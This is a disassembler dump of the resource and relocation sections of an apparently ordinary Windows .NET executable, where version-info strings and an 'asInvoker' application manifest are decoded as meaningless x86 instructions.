  406412:	jne    0x406414
  406414:	je     0x406416
  406416:	imul   eax,DWORD PTR [eax],0x6e006f
  40641c:	add    BYTE PTR gs:[esi+0x0],ch
  406420:	add    BYTE PTR [bx+di+0x0],ch
  406424:	outs   dx,BYTE PTR ds:[esi]
  406425:	add    BYTE PTR [ebp+0x0],ah
  406428:	add    BYTE PTR cs:[ecx+0x0],ah
  40642c:	jo     0x40642e
  40642e:	jo     0x406430
  406430:	arpl   WORD PTR [eax],ax
  406432:	outs   dx,DWORD PTR ds:[esi]
  406433:	add    BYTE PTR [esi+0x0],ch
  406436:	je     0x406438
  406438:	popa   
  406439:	add    BYTE PTR [ecx+0x0],ch
  40643c:	outs   dx,BYTE PTR ds:[esi]
  40643d:	add    BYTE PTR [ebp+0x0],ah
  406440:	jb     0x406442
  406442:	add    BYTE PTR cs:[ebp+0x0],ah
  406446:	js     0x406448
  406448:	add    BYTE PTR gs:[eax],al
  40644b:	add    BYTE PTR [eax+0x0],ah
  40644e:	pop    ds
  40644f:	add    BYTE PTR [ecx],al
  406451:	add    BYTE PTR [eax+0x0],dl
  406454:	jb     0x406456
  406456:	outs   dx,DWORD PTR ds:[esi]
  406457:	add    BYTE PTR [eax+eax*1+0x75],ah
  40645b:	add    BYTE PTR [ebx+0x0],ah
  40645e:	je     0x406460
  406460:	dec    esi
  406461:	add    BYTE PTR [ecx+0x0],ah
  406464:	ins    DWORD PTR es:[edi],dx
  406465:	add    BYTE PTR [ebp+0x0],ah
  406468:	add    BYTE PTR [eax],al
  40646a:	add    BYTE PTR [eax],al
  40646c:	dec    ebp
  40646d:	add    BYTE PTR [ecx+0x0],ch
  406470:	arpl   WORD PTR [eax],ax
  406472:	jb     0x406474
  406474:	outs   dx,DWORD PTR ds:[esi]
  406475:	add    BYTE PTR [ebx+0x0],dh
  406478:	outs   dx,DWORD PTR ds:[esi]
  406479:	add    BYTE PTR [esi+0x0],ah
  40647c:	je     0x40647e
  40647e:	scas   al,BYTE PTR es:[edi]
  40647f:	add    BYTE PTR [eax],ah
  406481:	add    BYTE PTR [esi+0x0],dl
  406484:	imul   eax,DWORD PTR [eax],0x750073
  40648a:	popa   
  40648b:	add    BYTE PTR [eax+eax*1+0x20],ch
  40648f:	add    BYTE PTR [ebx+0x0],dl
  406492:	je     0x406494
  406494:	jne    0x406496
  406496:	add    BYTE PTR fs:[ecx+0x0],ch
  40649a:	outs   dx,DWORD PTR ds:[esi]
  40649b:	add    BYTE PTR [esi+0x32002000],ch
  4064a1:	add    BYTE PTR [eax],dh
  4064a3:	add    BYTE PTR [ecx],dh
  4064a5:	add    BYTE PTR [edx],dh
  4064a7:	add    BYTE PTR [eax],al
  4064a9:	add    BYTE PTR [eax],al
  4064ab:	add    BYTE PTR [eax+0x0],al
  4064ae:	or     eax,0x50000100
  4064b3:	add    BYTE PTR [edx+0x0],dh
  4064b6:	outs   dx,DWORD PTR ds:[esi]
  4064b7:	add    BYTE PTR [eax+eax*1+0x75],ah
  4064bb:	add    BYTE PTR [ebx+0x0],ah
  4064be:	je     0x4064c0
  4064c0:	push   esi
  4064c1:	add    BYTE PTR [ebp+0x0],ah
  4064c4:	jb     0x4064c6
  4064c6:	jae    0x4064c8
  4064c8:	imul   eax,DWORD PTR [eax],0x6e006f
  4064ce:	add    BYTE PTR [eax],al
  4064d0:	xor    DWORD PTR [eax],eax
  4064d2:	xor    DWORD PTR [eax],eax
  4064d4:	add    BYTE PTR cs:[eax],dh
  4064d7:	add    BYTE PTR [esi],ch
  4064d9:	add    BYTE PTR ds:0x37003000,dh
  4064df:	add    BYTE PTR [edx],dh
  4064e1:	add    BYTE PTR [edi],dh
  4064e3:	add    BYTE PTR [esi],ch
  4064e5:	add    BYTE PTR [ecx],dh
  4064e7:	add    BYTE PTR [eax],al
  4064e9:	add    BYTE PTR [eax],al
  4064eb:	add    BYTE PTR [eax+eax*1],bh
  4064ee:	or     DWORD PTR [eax],eax
  4064f0:	add    DWORD PTR [eax],eax
  4064f2:	inc    ecx
  4064f3:	add    BYTE PTR [ebx+0x0],dh
  4064f6:	jae    0x4064f8
  4064f8:	add    BYTE PTR gs:[ebp+0x0],ch
  4064fc:	bound  eax,QWORD PTR [eax]
  4064fe:	ins    BYTE PTR es:[edi],dx
  4064ff:	add    BYTE PTR [ecx+0x0],bh
  406502:	and    BYTE PTR [eax],al
  406504:	push   esi
  406505:	add    BYTE PTR [ebp+0x0],ah
  406508:	jb     0x40650a
  40650a:	jae    0x40650c
  40650c:	imul   eax,DWORD PTR [eax],0x6e006f
  406512:	add    BYTE PTR [eax],al
  406514:	xor    DWORD PTR [eax],eax
  406516:	xor    DWORD PTR [eax],eax
  406518:	add    BYTE PTR cs:[eax],dh
  40651b:	add    BYTE PTR [esi],ch
  40651d:	add    BYTE PTR [eax],dh
  40651f:	add    BYTE PTR [esi],ch
  406521:	add    BYTE PTR [eax],dh
  406523:	add    BYTE PTR [eax],al
  406525:	add    BYTE PTR [eax],al
  406527:	add    bh,ch
  406529:	mov    ebx,0x783f3cbf
  40652e:	ins    DWORD PTR es:[edi],dx
  40652f:	ins    BYTE PTR es:[edi],dx
  406530:	and    BYTE PTR [esi+0x65],dh
  406533:	jb     0x4065a8
  406535:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40653c:	xor    BYTE PTR [edx],ah
  40653e:	and    BYTE PTR [ebp+0x6e],ah
  406541:	arpl   WORD PTR [edi+0x64],bp
  406544:	imul   ebp,DWORD PTR [esi+0x67],0x5455223d
  40654b:	inc    esi
  40654c:	sub    eax,0x73202238
  406551:	je     0x4065b4
  406553:	outs   dx,BYTE PTR ds:[esi]
  406554:	fs popa 
  406556:	ins    BYTE PTR es:[edi],dx
  406557:	outs   dx,DWORD PTR ds:[esi]
  406558:	outs   dx,BYTE PTR ds:[esi]
  406559:	gs cmp eax,0x73657922
  40655f:	and    bh,BYTE PTR [edi]
  406561:	ds or  eax,0x73613c0a
  406567:	jae    0x4065ce
  406569:	ins    DWORD PTR es:[edi],dx
  40656a:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40656e:	js     0x4065dd
  406570:	ins    BYTE PTR es:[edi],dx
  406571:	outs   dx,BYTE PTR ds:[esi]
  406572:	jae    0x4065b1
  406574:	and    dh,BYTE PTR [ebp+0x72]
  406577:	outs   dx,BYTE PTR ds:[esi]
  406578:	cmp    dh,BYTE PTR [ebx+0x63]
  40657b:	push   0x73616d65
  406580:	sub    eax,0x7263696d
  406585:	outs   dx,DWORD PTR ds:[esi]
  406586:	jae    0x4065f7
  406588:	data16 je 0x4065b8
  40658b:	arpl   WORD PTR [edi+0x6d],bp
  40658e:	cmp    ah,BYTE PTR [ecx+0x73]
  406591:	ins    DWORD PTR es:[edi],dx
  406592:	cs jbe 0x4065c6
  406595:	and    ah,BYTE PTR [eax]
  406597:	ins    DWORD PTR es:[edi],dx
  406598:	popa   
  406599:	outs   dx,BYTE PTR ds:[esi]
  40659a:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  4065a1:	jb     0x406616
  4065a3:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4065aa:	xor    BYTE PTR [edx],ah
  4065ac:	ds or  eax,0x3c20200a
  4065b2:	popa   
  4065b3:	jae    0x406628
  4065b5:	gs ins DWORD PTR es:[edi],dx
  4065b7:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4065bb:	fs outs dx,BYTE PTR gs:[esi]
  4065be:	je     0x406629
  4065c0:	je     0x40663b
  4065c2:	and    BYTE PTR [esi+0x65],dh
  4065c5:	jb     0x40663a
  4065c7:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  4065ce:	xor    BYTE PTR [esi],ch
  4065d0:	xor    BYTE PTR [esi],ch
  4065d2:	xor    BYTE PTR [edx],ah
  4065d4:	and    BYTE PTR [esi+0x61],ch
  4065d7:	ins    DWORD PTR es:[edi],dx
  4065d8:	gs cmp eax,0x41794d22
  4065de:	jo     0x406650
  4065e0:	ins    BYTE PTR es:[edi],dx
  4065e1:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  4065e8:	cs popa 
  4065ea:	jo     0x40665c
  4065ec:	and    ch,BYTE PTR [edi]
  4065ee:	ds or  eax,0x3c20200a
  4065f4:	je     0x406668
  4065f6:	jne    0x40666b
  4065f8:	je     0x406643
  4065fa:	outs   dx,BYTE PTR ds:[esi]
  4065fb:	outs   dx,WORD PTR ds:[esi]
  4065fd:	and    BYTE PTR [eax+0x6d],bh
  406600:	ins    BYTE PTR es:[edi],dx
  406601:	outs   dx,BYTE PTR ds:[esi]
  406602:	jae    0x406641
  406604:	and    dh,BYTE PTR [ebp+0x72]
  406607:	outs   dx,BYTE PTR ds:[esi]
  406608:	cmp    dh,BYTE PTR [ebx+0x63]
  40660b:	push   0x73616d65
  406610:	sub    eax,0x7263696d
  406615:	outs   dx,DWORD PTR ds:[esi]
  406616:	jae    0x406687
  406618:	data16 je 0x406648
  40661b:	arpl   WORD PTR [edi+0x6d],bp
  40661e:	cmp    ah,BYTE PTR [ecx+0x73]
  406621:	ins    DWORD PTR es:[edi],dx
  406622:	cs jbe 0x406657
  406625:	and    bh,BYTE PTR [esi]
  406627:	or     eax,0x2020200a
  40662c:	and    BYTE PTR [ebx+esi*2],bh
  40662f:	arpl   WORD PTR gs:[ebp+0x72],si
  406633:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  40663b:	and    BYTE PTR [eax],ah
  40663d:	and    BYTE PTR [eax],ah
  40663f:	cmp    al,0x72
  406641:	gs jno 0x4066b9
  406644:	gs jae 0x4066bb
  406647:	gs fs push eax
  40664a:	jb     0x4066b5
  40664c:	jbe    0x4066b7
  40664e:	ins    BYTE PTR es:[edi],dx
  40664f:	gs addr16 gs jae 0x406674
  406654:	js     0x4066c3
  406656:	ins    BYTE PTR es:[edi],dx
  406657:	outs   dx,BYTE PTR ds:[esi]
  406658:	jae    0x406697
  40665a:	and    dh,BYTE PTR [ebp+0x72]
  40665d:	outs   dx,BYTE PTR ds:[esi]
  40665e:	cmp    dh,BYTE PTR [ebx+0x63]
  406661:	push   0x73616d65
  406666:	sub    eax,0x7263696d
  40666b:	outs   dx,DWORD PTR ds:[esi]
  40666c:	jae    0x4066dd
  40666e:	data16 je 0x40669e
  406671:	arpl   WORD PTR [edi+0x6d],bp
  406674:	cmp    ah,BYTE PTR [ecx+0x73]
  406677:	ins    DWORD PTR es:[edi],dx
  406678:	cs jbe 0x4066ae
  40667b:	and    bh,BYTE PTR [esi]
  40667d:	or     eax,0x2020200a
  406682:	and    BYTE PTR [eax],ah
  406684:	and    BYTE PTR [eax],ah
  406686:	and    BYTE PTR [edx+esi*2],bh
  406689:	gs jno 0x406701
  40668c:	gs jae 0x406703
  40668f:	gs fs inc ebp
  406692:	js     0x4066f9
  406694:	arpl   WORD PTR [ebp+0x74],si
  406697:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40669e:	ins    BYTE PTR es:[edi],dx
  40669f:	and    BYTE PTR [ebp+eiz*2+0x76],ch
  4066a3:	gs ins BYTE PTR es:[edi],dx
  4066a5:	cmp    eax,0x49736122
  4066aa:	outs   dx,BYTE PTR ds:[esi]
  4066ab:	jbe    0x40671c
  4066ad:	imul   esp,DWORD PTR [ebp+0x72],0x22
  4066b1:	and    BYTE PTR [ebp+0x69],dh
  4066b4:	inc    ecx
  4066b5:	arpl   WORD PTR [ebx+0x65],sp
  4066b8:	jae    0x40672d
  4066ba:	cmp    eax,0x6c616622
  4066bf:	jae    0x406726
  4066c1:	and    ch,BYTE PTR [edi]
  4066c3:	ds or  eax,0x2020200a
  4066c9:	and    BYTE PTR [eax],ah
  4066cb:	and    BYTE PTR [edi+ebp*1],bh
  4066ce:	jb     0x406735
  4066d0:	jno    0x406747
  4066d2:	gs jae 0x406749
  4066d5:	gs fs push eax
  4066d8:	jb     0x406743
  4066da:	jbe    0x406745
  4066dc:	ins    BYTE PTR es:[edi],dx
  4066dd:	gs addr16 gs jae 0x406720
  4066e2:	or     eax,0x2020200a
  4066e7:	and    BYTE PTR [edi+ebp*1],bh
  4066ea:	jae    0x406751
  4066ec:	arpl   WORD PTR [ebp+0x72],si
  4066ef:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a0d
  4066f7:	cmp    al,0x2f
  4066f9:	je     0x40676d
  4066fb:	jne    0x406770
  4066fd:	je     0x406748
  4066ff:	outs   dx,BYTE PTR ds:[esi]
  406700:	outs   dx,WORD PTR ds:[esi]
  406702:	ds or  eax,0x612f3c0a
  406708:	jae    0x40677d
  40670a:	gs ins DWORD PTR es:[edi],dx
  40670c:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  406710:	or     eax,0xa
  406715:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00408000 <.reloc>:
  408000:	add    BYTE PTR [eax+0x0],dl
  408003:	add    BYTE PTR [eax+eax*1],cl
  408006:	add    BYTE PTR [eax],al
  408008:	xor    BYTE PTR [edx],bh
	...
